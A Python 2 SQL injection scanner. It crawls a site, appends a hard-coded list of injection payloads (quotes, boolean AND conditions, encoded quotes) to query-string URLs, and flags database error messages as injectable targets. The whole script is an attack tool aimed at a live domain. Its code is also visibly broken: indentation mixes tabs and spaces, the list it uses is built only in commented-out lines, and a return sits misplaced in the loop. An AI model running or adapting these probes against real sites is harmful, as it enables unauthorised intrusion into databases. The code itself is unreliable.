# -*- coding: utf-8 -*-
# @Time    : 2018/5/6 0006 13:25
# @Author  : Langzi
# @Blog    : www.langzi.fun
# @File    : 检测sql注入.py
# @Software: PyCharm
import sys
import re
import requests
import time
import random
reload(sys)
sys.setdefaultencoding('utf-8')

payloads = ("'", "')", "';", '"', '")', '";',"--","-0",") AND 1998=1532 AND (5526=5526"," AND 5434=5692%23"," %' AND 5268=2356 AND '%'='"," ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV",'`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
sql_errors = {'SQL syntax':'mysql','syntax to use near':'mysql','MySQLSyntaxErrorException':'mysql','valid MySQL result':'mysql',
			  'Access Database Engine':'Access','JET Database Engine':'Access','Microsoft Access Driver':'Access',
			'SQLServerException':'mssql','SqlException':'mssql','SQLServer JDBC Driver':'mssql','Incorrect syntax':'mssql',
			  'MySQL Query fail':'mysql'
		 }

def scan_sql(url):
	try:
		headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"}
		print 'Cheaking: ' + url
        r_crawl = requests.get(url=url,headers=headers,timeout=5)
        rr = re.findall(r'(\w*\:\/\/[a-zA-Z0-9\.\-\_\/]+)', r_crawl.content)
        for x in rr:
            print x
		# r_crawl = requests.get(url=url, headers=headers, timeout=5)
		# r_sql = re.findall('href="(.*?)"', r_crawl.content)
		# list_none = []
		# for sql_sql in r_sql:
		# 	if 'php?' in sql_sql:
		# 		if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
		# 			list_none.append(url + '/' + sql_sql.lstrip('/'))
		# 		else:
		# 			pass
		# 	else:
		# 		pass
		# 	if 'asp?' in sql_sql:
		# 		if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
		# 			list_none.append(url + '/' + sql_sql.lstrip('/'))
		# 		else:
		# 			pass
		# 	else:
		# 		pass
		# 	if 'aspx?' in sql_sql:
		# 		if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
		# 			list_none.append(url + '/' + sql_sql.lstrip('/'))
		# 		else:
		# 			pass
		# 	else:
		# 		pass
		# 	if 'jsp?' in sql_sql:
		# 		if not 'http' in sql_sql and not 'jsvascript' in sql_sql:
		# 			list_none.append(url + '/' + sql_sql.lstrip('/'))
		# 		else:
		# 			pass
		# 	else:
		# 		pass
		if len(list_none)>1:
                        print 'Found:'+ str(len(list_none)) + 'url'
                        if len(list_none) > 5:
                                list_sql = random.sample(list_none, 4)
                        else:
                                list_sql = list_none
                        for inj in payloads:
                                for xxxx in list_sql:
                                    url = xxxx
                                    url_inj = url + str(inj)
                                    r_inj = requests.get(url=url_inj, headers=headers, timeout=5,allow_redirects=False)
                                    nowtime = time.strftime("%H:%M:%S", time.localtime())
                                    print  nowtime + ' ' +str(r_inj.url) + '  ' + str(r_inj.status_code)
                                    for key, vlue in sql_errors.iteritems():
                                        if str(key) in r_inj.content:
                                            nowtime=time.strftime("%H:%M:%S", time.localtime())
                                            print nowtime+' [*]Found SQL Injection : ' + str(r_inj.url) + 'Type : ' + str(vlue)
                                            with open('result.txt','a+') as a:
                                                a.write(str(r_inj.url) + ' : ' + str(vlue)+'\n')
                                                return ''
                                        else:
                                            pass
		else:
                print '暂时没有爬去到可疑连接'
	except Exception,e:
                print e

scan_sql('http://langzi.fun')
